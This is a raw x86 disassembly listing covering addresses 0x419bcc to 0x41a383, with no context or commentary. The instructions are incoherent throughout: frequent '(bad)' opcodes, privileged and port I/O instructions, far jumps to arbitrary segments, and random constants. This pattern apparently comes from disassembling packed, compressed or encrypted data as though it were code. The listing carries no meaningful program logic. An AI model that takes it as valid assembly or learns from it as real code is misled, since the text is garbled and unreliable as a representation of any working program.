  419bcc:	js     0x419bf2
  419bce:	in     al,0x14
  419bd0:	xlat   BYTE PTR ds:[ebx]
  419bd1:	fimul  DWORD PTR [ebx-0x15]
  419bd4:	pop    edi
  419bd5:	sub    BYTE PTR [edi+0x40],0x69
  419bd9:	jecxz  0x419bc5
  419bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bdc:	aas    
  419bdd:	imul   eax,ecx,0x12
  419be0:	call   0x68cf099a
  419be5:	xchg   esp,eax
  419be6:	sysexit 
  419be8:	and    bl,BYTE PTR [esp+eiz*8+0x7f08a539]
  419bef:	lahf   
  419bf0:	test   eax,0xfad4ae40
  419bf5:	fidiv  DWORD PTR [eax-0x45ff4b4f]
  419bfb:	mov    ebx,0x4b3fe89d
  419c00:	repnz movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  419c03:	push   ecx
  419c04:	jl     0x419c6a
  419c06:	and    cl,ch
  419c08:	fsub   QWORD PTR [ebx+0x19]
  419c0b:	xchg   ecx,eax
  419c0c:	imul   ecx,DWORD PTR [ebp-0x51],0x70
  419c10:	pop    ecx
  419c11:	pop    esp
  419c12:	jp     0x419bab
  419c14:	lea    edx,[ecx+0x5a3a97dd]
  419c1a:	add    edi,DWORD PTR [ebx+0x3c7c5a5a]
  419c20:	push   eax
  419c21:	or     al,0x66
  419c23:	shr    BYTE PTR [ecx],cl
  419c25:	(bad)  
  419c26:	fild   QWORD PTR [esi+0x3a]
  419c29:	mov    esi,DWORD PTR [edx-0x21]
  419c2c:	xchg   BYTE PTR [edx],cl
  419c2e:	push   esi
  419c2f:	add    DWORD PTR [ebx+eiz*8+0x51],0x51
  419c34:	pop    edi
  419c35:	fisub  DWORD PTR ds:0x1f85118b
  419c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c3c:	repz or DWORD PTR [ebx],ebx
  419c3f:	jmp    0x419c60
  419c41:	push   ebx
  419c42:	mov    esp,0xe525ece4
  419c47:	mov    edi,esp
  419c49:	and    DWORD PTR [edx+edi*4-0x61],eax
  419c4d:	mov    ah,0xe
  419c4f:	(bad)  
  419c50:	mov    ah,0x11
  419c52:	pop    eax
  419c53:	mov    ah,0xc0
  419c55:	cmp    BYTE PTR [eax-0xa6d57e2],bh
  419c5b:	mov    dh,0xb5
  419c5d:	(bad)  
  419c5e:	dec    edi
  419c5f:	adc    DWORD PTR ds:0x75bf6fb4,edx
  419c65:	stc    
  419c66:	lahf   
  419c67:	dec    esi
  419c68:	(bad)  
  419c69:	cdq    
  419c6a:	fisubr WORD PTR [edi-0x4abe4e13]
  419c70:	pop    esp
  419c71:	retf   
  419c72:	scas   eax,DWORD PTR es:[edi]
  419c73:	add    ah,cl
  419c75:	pop    edx
  419c76:	push   es
  419c77:	mov    cl,ch
  419c79:	lea    eax,[ecx]
  419c7b:	jmp    0x6b39:0xfcb4cc0c
  419c82:	or     ax,0x91dc
  419c86:	or     ebx,DWORD PTR [eax-0x48]
  419c89:	icebp  
  419c8a:	cld    
  419c8b:	fs mov esi,0x4256f70b
  419c91:	or     ch,dh
  419c93:	xor    ebx,DWORD PTR [ebp-0x58b10d38]
  419c99:	repz xchg esp,eax
  419c9b:	jg     0x419ccf
  419c9d:	or     DWORD PTR ds:0x9ebcc7d,edx
  419ca3:	ret    0xdf06
  419ca6:	std    
  419ca7:	inc    ebx
  419ca8:	cmp    BYTE PTR ds:0x24517ffb,ah
  419cae:	sbb    BYTE PTR [edi-0x7fb79be0],bh
  419cb4:	fist   DWORD PTR ds:0xf3010f08
  419cba:	cs cs js 0x419ccd
  419cbe:	push   edx
  419cbf:	sub    DWORD PTR [ecx+0x72109bc2],edi
  419cc5:	cmp    BYTE PTR [ebx-0x5cb7b08e],ah
  419ccb:	jno    0x419cd1
  419ccd:	push   es
  419cce:	mov    al,ds:0xdba39258
  419cd3:	pushf  
  419cd4:	and    ah,BYTE PTR [eax+0x23a4d5c2]
  419cda:	mov    esp,0x83ca091
  419cdf:	jbe    0x419ccc
  419ce1:	push   eax
  419ce2:	inc    ecx
  419ce3:	or     DWORD PTR [edi],esp
  419ce5:	xor    eax,0xd5bb05fd
  419cea:	test   eax,0x39c6c188
  419cef:	xchg   edx,eax
  419cf0:	gs pop ss
  419cf2:	jmp    0xc458:0x9620dd5e
  419cf9:	std    
  419cfa:	mov    dl,dh
  419cfc:	dec    ecx
  419cfd:	mov    bh,BYTE PTR [esp+ecx*4+0x23]
  419d01:	dec    edx
  419d02:	stos   DWORD PTR es:[edi],eax
  419d03:	bswap  eax
  419d05:	mov    ah,0x7d
  419d07:	xchg   esp,eax
  419d08:	pop    edx
  419d09:	dec    ebp
  419d0a:	mov    bh,0xaf
  419d0c:	sub    edx,DWORD PTR [edx]
  419d0e:	call   0xc05524a2
  419d13:	mov    ds:0xa043c83d,al
  419d18:	bound  esp,QWORD PTR [ebp-0x58c232d6]
  419d1e:	imul   ecx,DWORD PTR [ecx],0xffffffd4
  419d21:	pop    es
  419d22:	out    0x7e,eax
  419d24:	bound  ecx,QWORD PTR [esi]
  419d26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d27:	mov    ebx,0xb9cc409c
  419d2c:	add    dl,bh
  419d2e:	mov    eax,0x5e670c5c
  419d33:	imul   edi,DWORD PTR [edx-0x62bcd909],0x8a026f4e
  419d3d:	pop    eax
  419d3e:	clc    
  419d3f:	jle    0x419d1e
  419d41:	in     eax,0x5e
  419d43:	and    DWORD PTR [esi-0xe79ea75],ebp
  419d49:	xchg   ebp,eax
  419d4a:	mov    esp,0xb237743c
  419d4f:	aam    0xe8
  419d51:	fld    DWORD PTR [ecx]
  419d53:	pop    ds
  419d54:	adc    al,BYTE PTR [ecx+0x27]
  419d57:	fwait
  419d58:	out    dx,eax
  419d59:	lock jb 0x419d2e
  419d5c:	leave  
  419d5d:	push   edi
  419d5e:	adc    ebp,esi
  419d60:	jmp    FWORD PTR [ecx+0x1ec23479]
  419d66:	mov    al,ds:0xac43cc13
  419d6b:	xor    DWORD PTR [ebx+0x4f7de9ee],0x4
  419d72:	pop    edx
  419d73:	inc    ebp
  419d74:	mov    edi,0x4f86ec25
  419d79:	pushf  
  419d7a:	pop    ds
  419d7b:	in     al,0x74
  419d7d:	popf   
  419d7e:	mov    ecx,0x4f7f333e
  419d83:	mov    WORD PTR [edi+0x58b3dbb7],gs
  419d89:	fs dec esi
  419d8b:	sahf   
  419d8c:	sbb    al,BYTE PTR [ebx+0x55]
  419d8f:	sub    DWORD PTR [ebx+edi*8-0x7d0c05de],ebp
  419d96:	mov    bh,0x58
  419d98:	cmp    BYTE PTR [eax-0x2e14148f],bl
  419d9e:	push   0xffffff82
  419da0:	inc    esp
  419da1:	ins    BYTE PTR es:[edi],dx
  419da2:	or     eax,0x9711e835
  419da7:	inc    DWORD PTR [edx]
  419da9:	stos   BYTE PTR es:[edi],al
  419daa:	test   BYTE PTR [edi-0x120aab5a],ch
  419db0:	cs (bad) 
  419db2:	popw   ds
  419db4:	jecxz  0x419dd1
  419db6:	pop    esp
  419db7:	pop    esp
  419db8:	arpl   WORD PTR [ecx+0x23],dx
  419dbb:	push   edx
  419dbc:	sbb    esi,DWORD PTR [ebp-0x7c]
  419dbf:	out    dx,al
  419dc0:	retf   
  419dc1:	jmp    0x70f2dd54
  419dc6:	sub    eax,0x70521ab8
  419dcb:	sub    BYTE PTR [ebp+0x5c],dl
  419dce:	lods   al,BYTE PTR ds:[esi]
  419dcf:	inc    esp
  419dd0:	xor    ah,ch
  419dd2:	push   cs
  419dd3:	mov    dh,0x6c
  419dd5:	jp     0x419df4
  419dd7:	jno    0x419e3d
  419dd9:	pushf  
  419dda:	shl    DWORD PTR [edx],1
  419ddc:	mov    ah,0xee
  419dde:	cmp    al,0x66
  419de0:	test   BYTE PTR ds:0x4dbaa034,ah
  419de6:	out    0xea,al
  419de8:	inc    eax
  419dea:	jg     0x419d84
  419dec:	jmp    0x946e:0xb547cea
  419df3:	inc    BYTE PTR [ebp-0x45]
  419df6:	jno    0x419e17
  419df8:	jne    0x419d86
  419dfa:	cmp    edi,DWORD PTR [ebp-0x44]
  419dfd:	sbb    BYTE PTR [edi+0x10],al
  419e00:	arpl   WORD PTR [edi],di
  419e02:	pop    ebx
  419e03:	stos   DWORD PTR es:[edi],eax
  419e04:	mov    BYTE PTR [ebx-0x37],ah
  419e07:	push   edx
  419e08:	aaa    
  419e09:	(bad)  
  419e0a:	push   ss
  419e0b:	stc    
  419e0c:	adc    eax,0xbdd3c842
  419e11:	in     eax,0xb4
  419e13:	shr    DWORD PTR [ebp+0x18],cl
  419e16:	iret   
  419e17:	imul   BYTE PTR [eax-0x75]
  419e1a:	push   ecx
  419e1b:	push   ds
  419e1c:	into   
  419e1d:	sub    al,0x35
  419e1f:	xchg   edi,eax
  419e20:	push   eax
  419e21:	sub    DWORD PTR [esi+0x278c6dca],0xffffffc7
  419e28:	push   esp
  419e29:	jecxz  0x419e27
  419e2b:	mov    dh,0xbc
  419e2d:	out    0x44,eax
  419e2f:	jb     0x419dcf
  419e31:	and    bh,dl
  419e33:	xchg   BYTE PTR es:[esi],dl
  419e36:	sbb    al,0xc5
  419e38:	pusha  
  419e39:	das    
  419e3a:	mov    ds:0x365a4cd0,al
  419e3f:	cmp    eax,0x9d51714c
  419e44:	or     BYTE PTR [edx+0x16691932],cl
  419e4a:	push   ebx
  419e4b:	fist   WORD PTR [esp+ebx*8]
  419e4e:	xchg   edi,eax
  419e4f:	jp     0x419e8f
  419e51:	add    BYTE PTR [edx-0x28],dl
  419e54:	in     eax,dx
  419e55:	sbb    ch,cl
  419e57:	pop    ds
  419e58:	cmp    al,0x82
  419e5a:	xor    eax,0x9ebe8469
  419e5f:	or     DWORD PTR [ecx-0x6f],ebp
  419e62:	sbb    DWORD PTR [edx],edx
  419e64:	mov    esi,ecx
  419e66:	push   0xa4661636
  419e6b:	or     eax,0x67295fcd
  419e70:	xor    ch,BYTE PTR [esi]
  419e72:	shl    DWORD PTR [ecx],1
  419e74:	inc    ecx
  419e75:	pop    ds
  419e76:	fiadd  WORD PTR [esi-0x6b]
  419e79:	mov    ebx,0xe8fcab3f
  419e7e:	jle    0x419ed0
  419e80:	fdiv   st,st(4)
  419e82:	inc    edx
  419e83:	xor    eax,0x383d2aeb
  419e88:	aas    
  419e89:	xchg   ebx,eax
  419e8a:	mov    bh,0x0
  419e8c:	stc    
  419e8d:	clc    
  419e8e:	iret   
  419e8f:	dec    ebp
  419e90:	inc    esp
  419e91:	shr    bl,1
  419e93:	dec    edx
  419e94:	push   0xffffffdc
  419e96:	push   ecx
  419e97:	add    esi,DWORD PTR [esi-0x54]
  419e9a:	and    eax,eax
  419e9c:	xchg   ecx,eax
  419e9d:	jge    0x419e97
  419e9f:	int    0xd8
  419ea1:	mov    al,0x42
  419ea3:	sub    ecx,0xce5706b4
  419ea9:	shr    BYTE PTR [edx+0x42c320a4],1
  419eaf:	mov    dh,0x8c
  419eb1:	mov    eax,0x6c994811
  419eb6:	jl     0x419f0b
  419eb8:	out    dx,al
  419eb9:	xor    DWORD PTR [ecx-0x28],esi
  419ebc:	imul   edi,esp,0xffffffec
  419ebf:	fdiv   QWORD PTR [edx]
  419ec1:	sub    edi,DWORD PTR [esi+0x4f]
  419ec4:	out    dx,eax
  419ec5:	add    DWORD PTR [ecx],edi
  419ec7:	xchg   DWORD PTR [ebp-0x2b],edx
  419eca:	sar    BYTE PTR [esi-0x3db6b69d],1
  419ed0:	lods   al,BYTE PTR ds:[esi]
  419ed1:	dec    eax
  419ed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ed3:	or     al,0xc4
  419ed5:	jle    0x419ec9
  419ed7:	mov    dl,0xa6
  419ed9:	test   al,cl
  419edb:	adc    al,0xf3
  419edd:	es dec ebx
  419edf:	ja     0x419e75
  419ee1:	ret    
  419ee2:	fidiv  DWORD PTR [eax]
  419ee4:	push   ebx
  419ee5:	push   ebp
  419ee6:	lock sbb bh,BYTE PTR es:[ecx-0x723e3d5e]
  419eee:	mov    edi,0x4e52fefa
  419ef3:	leave  
  419ef4:	out    0xd8,al
  419ef6:	pop    esp
  419ef7:	lahf   
  419ef8:	test   DWORD PTR [ebx-0x3007dbf5],ebp
  419efe:	int    0xbd
  419f00:	jmp    0x419f53
  419f02:	ss dec eax
  419f04:	or     eax,0xe9352b40
  419f09:	push   esp
  419f0a:	shl    BYTE PTR [ebx+0x662fc255],cl
  419f10:	push   cs
  419f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f12:	add    ah,al
  419f14:	push   eax
  419f15:	pop    ebp
  419f16:	sar    BYTE PTR [edx+0xe59f099],1
  419f1c:	jbe    0x419f25
  419f1e:	adc    eax,0xcabdd40b
  419f23:	xchg   esi,eax
  419f24:	add    al,0xae
  419f26:	fstp   TBYTE PTR [esi]
  419f28:	(bad)  
  419f29:	ins    DWORD PTR es:[edi],dx
  419f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f2b:	adc    DWORD PTR [edi],0x4d44dfeb
  419f31:	iret   
  419f32:	fcomp  DWORD PTR [edi-0x28]
  419f35:	push   0x399df3c9
  419f3a:	or     bl,BYTE PTR [ebp-0x43]
  419f3d:	stos   DWORD PTR es:[edi],eax
  419f3e:	push   ebx
  419f3f:	clc    
  419f40:	(bad)  
  419f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f42:	lock mov ss,WORD PTR [esi]
  419f45:	es in  al,dx
  419f47:	or     eax,0x199d6f17
  419f4c:	mov    DWORD PTR [ebx+0x78b9e894],esp
  419f52:	stos   BYTE PTR es:[edi],al
  419f53:	mov    DWORD PTR [ebp-0x23f710ae],ebp
  419f59:	pop    ecx
  419f5a:	idiv   BYTE PTR [eax+0x73b646e5]
  419f60:	push   0xffffffa5
  419f62:	nop
  419f63:	mov    bl,0x41
  419f65:	scas   al,BYTE PTR es:[edi]
  419f66:	and    ebp,ebx
  419f68:	xchg   ebp,eax
  419f69:	cmp    eax,0xcd3eab2a
  419f6e:	cmp    ebx,DWORD PTR [edi-0x7bb1da71]
  419f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f75:	or     edi,DWORD PTR [ebx]
  419f77:	cld    
  419f78:	adc    al,0x1a
  419f7a:	push   ds
  419f7b:	pop    ebx
  419f7c:	dec    esi
  419f7d:	fsubr  QWORD PTR [esi+0x36]
  419f80:	adc    eax,0x7b295b95
  419f85:	out    0xbb,al
  419f87:	aas    
  419f88:	aas    
  419f89:	in     al,0x7
  419f8b:	jecxz  0x419f85
  419f8d:	div    DWORD PTR [ebx-0x10388ea8]
  419f93:	fisttp WORD PTR [edi-0x57005362]
  419f99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f9a:	stos   BYTE PTR es:[edi],al
  419f9b:	xchg   edx,eax
  419f9c:	sub    DWORD PTR [ebp-0x256057d9],esi
  419fa2:	ror    cl,1
  419fa4:	mov    ecx,0xd6525963
  419fa9:	xchg   ebp,eax
  419faa:	or     ecx,esp
  419fac:	inc    ecx
  419fad:	imul   BYTE PTR [esi+0x12]
  419fb0:	in     al,0x28
  419fb2:	in     eax,0x5b
  419fb4:	add    BYTE PTR ds:0xef24b9c8,al
  419fba:	push   edx
  419fbb:	jo     0x419f3e
  419fbd:	int    0x0
  419fbf:	adc    al,0x2c
  419fc1:	sbb    BYTE PTR [edi],bl
  419fc3:	push   DWORD PTR [ebx+0x1]
  419fc6:	test   eax,0xb48ceb2f
  419fcb:	dec    ebp
  419fcc:	pop    eax
  419fcd:	jno    0x419f53
  419fcf:	arpl   WORD PTR [ebx+0x148b8270],ax
  419fd5:	(bad)  
  419fd7:	in     al,dx
  419fd8:	push   esp
  419fd9:	fs ds cmp DWORD PTR ds:[eax-0x68],edi
  419fdf:	inc    ebp
  419fe0:	mov    al,0x2b
  419fe2:	mov    al,al
  419fe4:	or     esi,DWORD PTR [edx+edi*4-0xb]
  419fe8:	pop    eax
  419fe9:	call   0x7258:0x866ca014
  419ff0:	dec    edi
  419ff1:	retf   
  419ff2:	popa   
  419ff3:	repz or BYTE PTR [eax-0x5d],dh
  419ff7:	clc    
  419ff8:	mov    dl,0xc3
  419ffa:	dec    edi
  419ffb:	ror    DWORD PTR [edx+0x69c282b7],0x73
  41a002:	add    DWORD PTR [eax],0xe38094fe
  41a008:	add    ebx,edx
  41a00a:	adc    al,0xd1
  41a00c:	xchg   edx,eax
  41a00d:	(bad)  
  41a00e:	mov    ebp,DWORD PTR [edx]
  41a010:	call   edi
  41a012:	push   ecx
  41a013:	outs   dx,BYTE PTR ds:[esi]
  41a014:	loopne 0x41a00f
  41a016:	je     0x419fe2
  41a018:	(bad)  
  41a019:	ror    BYTE PTR [esi],0x47
  41a01c:	js     0x419fdd
  41a01e:	sar    DWORD PTR [eax],cl
  41a020:	fisttp WORD PTR [ebx]
  41a022:	cmc    
  41a023:	adc    al,0x21
  41a025:	sub    eax,0xc628facf
  41a02a:	jnp    0x41a06a
  41a02c:	mov    ebx,0xc77a9c1f
  41a031:	xchg   esi,eax
  41a032:	dec    edx
  41a033:	das    
  41a034:	push   ecx
  41a035:	lock adc al,bl
  41a038:	sub    al,0xf3
  41a03a:	popa   
  41a03b:	adc    al,0x5f
  41a03d:	sub    dh,BYTE PTR [esi+0x63f6f276]
  41a043:	in     eax,dx
  41a044:	imul   eax,DWORD PTR [edx-0x64],0x22018730
  41a04b:	sub    al,dl
  41a04d:	ins    DWORD PTR es:[edi],dx
  41a04e:	(bad)  
  41a04f:	sub    BYTE PTR fs:[esi+0x74e8e44a],ch
  41a056:	add    DWORD PTR [ebx+0x2aaa2f57],0x1c
  41a05d:	push   0x27
  41a05f:	ins    BYTE PTR es:[edi],dx
  41a060:	jecxz  0x41a0a0
  41a062:	loop   0x41a062
  41a064:	leave  
  41a065:	(bad)  
  41a066:	adc    ecx,DWORD PTR [eax]
  41a068:	and    eax,0xf16b454e
  41a06d:	dec    ecx
  41a06e:	or     ch,cl
  41a070:	or     BYTE PTR [esi-0x1d780b07],bh
  41a076:	leave  
  41a077:	js     0x41a067
  41a079:	stc    
  41a07a:	jmp    0x41a07f
  41a07c:	sub    BYTE PTR [esi-0x48],0x1
  41a080:	(bad)  
  41a082:	(bad)  
  41a083:	mov    BYTE PTR es:[eax-0x13],bh
  41a087:	add    al,0x58
  41a089:	mov    cl,0xc1
  41a08b:	sub    DWORD PTR [edi+0x5aa358a8],edx
  41a091:	sbb    BYTE PTR ds:0x5d4b7412,0x66
  41a098:	mov    cl,0x6c
  41a09a:	pop    edx
  41a09b:	call   0xe295:0x84ee97ea
  41a0a2:	out    0xfc,eax
  41a0a4:	jae    0x41a0bf
  41a0a6:	jp     0x41a0d9
  41a0a8:	jge    0x41a115
  41a0aa:	push   ecx
  41a0ab:	addr16 dec ecx
  41a0ad:	gs dec ebx
  41a0af:	rcr    BYTE PTR [ebp+0x7],0x95
  41a0b3:	test   BYTE PTR [ecx+esi*2+0x70],0x36
  41a0b8:	jmp    0xdcc5:0x7f126027
  41a0bf:	loopne 0x41a051
  41a0c1:	adc    DWORD PTR [edx],ebp
  41a0c3:	mov    eax,0xc4ea09e
  41a0c8:	mov    ah,0x76
  41a0ca:	pop    ebx
  41a0cb:	fistp  DWORD PTR [eax]
  41a0cd:	xchg   edx,eax
  41a0ce:	sbb    DWORD PTR [esi+0x7b],edi
  41a0d1:	push   0x2a
  41a0d3:	jg     0x41a079
  41a0d5:	ror    DWORD PTR [edx],1
  41a0d7:	mov    al,0x21
  41a0d9:	add    ebp,DWORD PTR [ebx+0x5d]
  41a0dc:	cdq    
  41a0dd:	push   ds
  41a0de:	cwde   
  41a0df:	xchg   ebp,eax
  41a0e0:	jecxz  0x41a06e
  41a0e2:	and    al,0x1d
  41a0e4:	aad    0xff
  41a0e6:	dec    edi
  41a0e7:	dec    esi
  41a0e8:	dec    ecx
  41a0e9:	add    ebx,DWORD PTR [edx+0x27a42931]
  41a0ef:	std    
  41a0f0:	xchg   edi,eax
  41a0f1:	mov    ebp,0x2d8750d4
  41a0f6:	(bad)  
  41a0f7:	dec    esp
  41a0f8:	leave  
  41a0f9:	sub    bh,dl
  41a0fb:	xor    al,0xe9
  41a0fd:	cmc    
  41a0fe:	sub    al,0xa3
  41a100:	mov    esi,0xc6f5a2d2
  41a105:	mov    cl,0x68
  41a107:	jmp    0x776c6694
  41a10c:	jle    0x41a09e
  41a10e:	dec    edx
  41a10f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a110:	and    eax,0x3c9a7c41
  41a115:	pushf  
  41a116:	icebp  
  41a117:	push   ss
  41a118:	ss mov ecx,0xdf6b8e9e
  41a11e:	mov    DWORD PTR [esi+0x22],ebx
  41a121:	pop    ebp
  41a122:	sub    edi,DWORD PTR [ecx]
  41a124:	xchg   ecx,eax
  41a125:	test   BYTE PTR [esi*4+0x6edbe417],bh
  41a12c:	(bad)  
  41a12d:	loopne 0x41a10d
  41a12f:	outs   dx,DWORD PTR ds:[esi]
  41a130:	cdq    
  41a131:	pop    ds
  41a132:	test   esp,edi
  41a134:	arpl   WORD PTR [ecx-0x62],si
  41a137:	dec    esp
  41a138:	or     al,0xe6
  41a13a:	xchg   bl,ah
  41a13c:	jbe    0x41a0f3
  41a13e:	inc    ebx
  41a13f:	adc    eax,0xabed89be
  41a144:	lods   al,BYTE PTR ds:[esi]
  41a145:	cmc    
  41a146:	push   ecx
  41a147:	mov    esi,0xfe1670ad
  41a14c:	add    dh,ch
  41a14e:	outs   dx,BYTE PTR ds:[esi]
  41a14f:	dec    ecx
  41a150:	pop    ecx
  41a151:	mov    eax,ds:0xe1fdbcbb
  41a156:	jne    0x41a1c0
  41a158:	es int3 
  41a15a:	call   0xb7b719ec
  41a15f:	sbb    edx,DWORD PTR [edi-0x691dd020]
  41a165:	out    0x33,al
  41a167:	mov    BYTE PTR [esi],0xab
  41a16a:	arpl   WORD PTR [ebx+0xe16aad5],cx
  41a170:	rol    DWORD PTR [esi-0x79],1
  41a173:	mov    ds:0xfc012c34,eax
  41a178:	mov    ?,WORD PTR [esi+eax*8+0x4a]
  41a17c:	cmp    al,0x8c
  41a17e:	ret    0xa6f7
  41a181:	retf   
  41a182:	mov    ebx,0xf81f03cb
  41a187:	lahf   
  41a188:	popa   
  41a189:	outs   dx,DWORD PTR ds:[esi]
  41a18a:	std    
  41a18b:	lea    ebp,[edx]
  41a18d:	add    eax,0x6c8e6b04
  41a192:	(bad)  
  41a193:	out    dx,al
  41a194:	iret   
  41a195:	lods   al,BYTE PTR ds:[esi]
  41a196:	int3   
  41a197:	adc    DWORD PTR [edi],edi
  41a199:	adc    BYTE PTR [ecx-0x5312bba9],dl
  41a19f:	(bad)  
  41a1a0:	dec    ebx
  41a1a1:	cmp    al,BYTE PTR [ecx+esi*8+0x430b84ba]
  41a1a8:	xor    al,0xc5
  41a1aa:	xor    DWORD PTR [esi],ecx
  41a1ac:	jnp    0x41a159
  41a1ae:	push   edx
  41a1af:	test   DWORD PTR [edi+ebx*4+0x616d7d7e],ecx
  41a1b6:	xor    ah,BYTE PTR [ebx]
  41a1b8:	push   esp
  41a1b9:	rcr    BYTE PTR [edx+0x1e0fd797],1
  41a1bf:	mov    ebx,0x5dec2b2c
  41a1c4:	je     0x41a204
  41a1c6:	xor    al,0xec
  41a1c8:	shl    DWORD PTR [edx-0x3cc6f84],cl
  41a1ce:	jmp    0x41a20f
  41a1d0:	pop    esi
  41a1d1:	adc    al,0x15
  41a1d3:	test   DWORD PTR [ecx+0x5f],0xf8fa8aba
  41a1da:	popa   
  41a1db:	push   es
  41a1dc:	addr16 adc eax,0xc8615e6c
  41a1e2:	jmp    0xc3b5:0x82a06bf3
  41a1e9:	sbb    al,0x5f
  41a1eb:	pop    eax
  41a1ec:	jmp    0xe3147a3f
  41a1f1:	xchg   ecx,eax
  41a1f2:	sahf   
  41a1f3:	dec    esi
  41a1f4:	dec    ecx
  41a1f5:	pusha  
  41a1f6:	ret    
  41a1f7:	ror    BYTE PTR [ebx+0x47],cl
  41a1fa:	xchg   esi,eax
  41a1fb:	jmp    0x5f08:0x44b18570
  41a202:	in     eax,0x3f
  41a204:	out    dx,al
  41a205:	shr    BYTE PTR [eax],cl
  41a207:	xchg   esi,eax
  41a208:	jmp    0x33cd:0x6de4cea7
  41a20f:	xor    ah,BYTE PTR [ecx-0x33]
  41a212:	mov    eax,0xb83d8d5e
  41a217:	ficomp WORD PTR [edi]
  41a219:	ja     0x41a284
  41a21b:	xlat   BYTE PTR ds:[ebx]
  41a21c:	adc    dh,dh
  41a21e:	inc    edx
  41a21f:	dec    eax
  41a220:	jmp    0xfc2e3d42
  41a225:	adc    BYTE PTR [esi-0x20],dl
  41a228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a229:	add    BYTE PTR [edi],dh
  41a22b:	cmp    al,0x72
  41a22d:	or     DWORD PTR [eax+0x53707ca7],ebx
  41a233:	inc    edi
  41a234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a235:	sbb    eax,0x85b7f199
  41a23a:	mov    edi,edi
  41a23c:	jbe    0x41a1c0
  41a23e:	rcl    DWORD PTR [edi-0x4ada68e4],cl
  41a244:	out    dx,al
  41a245:	or     eax,0x69cca533
  41a24a:	adc    eax,DWORD PTR [ecx+edi*2+0x5c]
  41a24e:	ds clc 
  41a250:	xchg   ebp,eax
  41a251:	mov    bl,0x81
  41a253:	xchg   ecx,esi
  41a255:	data16 jge 0x41a28c
  41a258:	and    al,0x4e
  41a25a:	mov    bh,0x8b
  41a25c:	test   eax,0xce09944a
  41a261:	mov    edx,0xff68c11c
  41a266:	push   0x3334f2a
  41a26b:	int    0x43
  41a26d:	jns    0x41a254
  41a26f:	add    dh,BYTE PTR [esi]
  41a271:	mov    esi,0x19db89b7
  41a276:	cli    
  41a277:	es test eax,0xcec53018
  41a27d:	mov    BYTE PTR [eax+0x2c],bh
  41a280:	sbb    esp,DWORD PTR [edx-0x31ef73c8]
  41a286:	and    DWORD PTR [ebp-0x4011019d],esi
  41a28c:	ror    cl,0x6
  41a28f:	xlat   BYTE PTR ds:[ebx]
  41a290:	ficom  DWORD PTR [edx-0x2b]
  41a293:	leave  
  41a294:	mov    dl,0x21
  41a296:	or     ebp,DWORD PTR [esi-0x4d]
  41a299:	push   0xf21a37e2
  41a29e:	xor    eax,DWORD PTR [edx+0x75]
  41a2a1:	xchg   ebx,eax
  41a2a2:	call   0xc09c95f9
  41a2a7:	arpl   WORD PTR [edx+0x44],sp
  41a2aa:	xor    DWORD PTR [esi+ecx*2-0x6c],edi
  41a2ae:	ret    
  41a2af:	push   ecx
  41a2b0:	add    esi,DWORD PTR [esi]
  41a2b2:	into   
  41a2b3:	jo     0x41a282
  41a2b5:	inc    edx
  41a2b6:	mov    WORD PTR [edi-0x7655bd65],ds
  41a2bc:	mov    edx,0x314c87fb
  41a2c1:	dec    edx
  41a2c2:	push   esp
  41a2c3:	mov    al,ds:0xc934e50c
  41a2c8:	push   ds
  41a2c9:	mov    ds:0xd14a83a6,eax
  41a2ce:	sbb    al,0xec
  41a2d0:	mov    ch,0x7
  41a2d2:	fidivr WORD PTR [ecx+0x53]
  41a2d5:	retf   0x1562
  41a2d8:	adc    bl,dl
  41a2da:	js     0x41a347
  41a2dc:	call   0xd884510a
  41a2e1:	gs gs gs cli 
  41a2e5:	cmp    al,0x62
  41a2e7:	sbb    eax,0x55fc6184
  41a2ec:	retf   
  41a2ed:	xchg   ebp,eax
  41a2ee:	or     eax,0x8838ae27
  41a2f3:	dec    edx
  41a2f4:	aaa    
  41a2f5:	sbb    BYTE PTR [edx+ecx*4-0x6f],0xa2
  41a2fa:	jb     0x41a35f
  41a2fc:	push   edx
  41a2fd:	cmc    
  41a2fe:	jle    0x41a2a0
  41a300:	cmp    ebx,esp
  41a302:	loop   0x41a2dd
  41a304:	in     al,dx
  41a305:	mov    DWORD PTR [ebx-0x67bfbaf0],edx
  41a30b:	inc    esi
  41a30c:	mov    edi,DWORD PTR [ebp+0xd]
  41a30f:	pop    edi
  41a310:	mov    ah,0x2
  41a312:	loope  0x41a327
  41a314:	pop    ds
  41a315:	retf   0xd290
  41a318:	push   cs
  41a319:	jno    0x41a36f
  41a31b:	inc    ebx
  41a31c:	sahf   
  41a31d:	push   edx
  41a31e:	cmp    DWORD PTR [edi-0x6cb84923],ecx
  41a324:	mov    cl,0x63
  41a326:	jmp    0x1594:0x2b7f98aa
  41a32d:	or     esp,DWORD PTR [eax-0x38]
  41a330:	popf   
  41a331:	inc    esp
  41a332:	cwde   
  41a333:	pop    es
  41a334:	adc    ecx,ecx
  41a336:	push   ebp
  41a337:	add    esi,edi
  41a339:	cmp    eax,0x5487407f
  41a33e:	(bad)  
  41a33f:	sub    ecx,DWORD PTR [ecx-0x2ab34610]
  41a345:	xor    eax,0xf9240682
  41a34a:	sahf   
  41a34b:	push   esp
  41a34c:	push   ds
  41a34d:	out    0x1a,al
  41a34f:	int3   
  41a350:	inc    ebx
  41a351:	pop    ds
  41a352:	jnp    0x41a395
  41a354:	pop    edx
  41a355:	out    0xc4,eax
  41a357:	lds    ebp,FWORD PTR [esi+ebp*2-0x4d0e2b03]
  41a35e:	loop   0x41a385
  41a360:	add    eax,0x5a5bc81e
  41a365:	ret    0x2651
  41a368:	mov    eax,0xe335d601
  41a36d:	mov    edx,0x3a3adbe2
  41a372:	push   edi
  41a373:	test   eax,0xdad67ef2
  41a378:	xchg   ebx,eax
  41a379:	xor    dl,BYTE PTR [ebx+0x53]
  41a37c:	adc    dh,BYTE PTR [ecx+eax*8-0x104188ed]
  41a383:	push   ss
